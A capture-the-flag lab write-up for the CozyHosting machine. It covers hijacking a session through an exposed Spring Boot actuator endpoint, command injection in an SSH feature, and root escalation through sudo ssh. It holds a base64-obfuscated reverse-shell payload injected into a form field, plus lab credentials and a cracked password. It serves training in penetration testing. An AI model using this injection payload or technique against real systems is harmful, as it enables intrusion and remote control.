+++
title = 'CozyHosting'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

Nmap scan.

![CozyHosting (Easy Linux).png](CozyHosting%20%28Easy%20Linux%29.png)

The website has a login page; the home page is pretty static with nothing interesting.

![CozyHosting (Easy Linux)-1.png](CozyHosting%20%28Easy%20Linux%29-1.png)

`/error` gives a 500, which is different to everything else - odd.

Tried vhost enumeration - no luck. No luck with default or common creds either. Page source reveals no other endpoints that really have anything.

No other ports, no other attack surface. So is the answer something to do with this 500?

![CozyHosting (Easy Linux)-2.png](CozyHosting%20%28Easy%20Linux%29-2.png)

The app must be Spring Boot - the Whitelabel Error Page is what pops up on 404s.

`/actuator` is a common sensitive endpoint exposed by default on Spring Boot apps.

![CozyHosting (Easy Linux)-3.png](CozyHosting%20%28Easy%20Linux%29-3.png)

Checked `/actuator/sessions`:

![CozyHosting (Easy Linux)-4.png](CozyHosting%20%28Easy%20Linux%29-4.png)

And `/actuator/mappings` - there was an interesting endpoint.

![CozyHosting (Easy Linux)-5.png](CozyHosting%20%28Easy%20Linux%29-5.png)

Pasting one of the session IDs into the JSESSIONID cookie gives us access to the admin page.

![CozyHosting (Easy Linux)-6.png](CozyHosting%20%28Easy%20Linux%29-6.png)

We have code exec - the app runs `ssh username@hostname` with the user input not sanitised.

![CozyHosting (Easy Linux)-7.png](CozyHosting%20%28Easy%20Linux%29-7.png)

![CozyHosting (Easy Linux)-8.png](CozyHosting%20%28Easy%20Linux%29-8.png)

```bash
;{echo,-n,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTk2LzkwMDEgMD4mMSAK}|{base64,-d}|bash;
```

![CozyHosting (Easy Linux)-9.png](CozyHosting%20%28Easy%20Linux%29-9.png)

There's a `.jar` file in `/app`. Downloaded it to the attacking machine and extracted it. Recursive grep for postgres turned up the database credentials:

![CozyHosting (Easy Linux)-10.png](CozyHosting%20%28Easy%20Linux%29-10.png)

`postgres`:`Vg&nvzAQ7XxR`

![CozyHosting (Easy Linux)-11.png](CozyHosting%20%28Easy%20Linux%29-11.png)

The admin password cracks to `manchesterunited` - and it works for user `josh`.

![CozyHosting (Easy Linux)-12.png](CozyHosting%20%28Easy%20Linux%29-12.png)

Privilege escalation was super easy - we can run the `ssh` binary with sudo. GTFO bins has a simple way to elevate to root:

![Pasted image 20260112183813.png](Pasted%20image%2020260112183813.png)

Root shell.
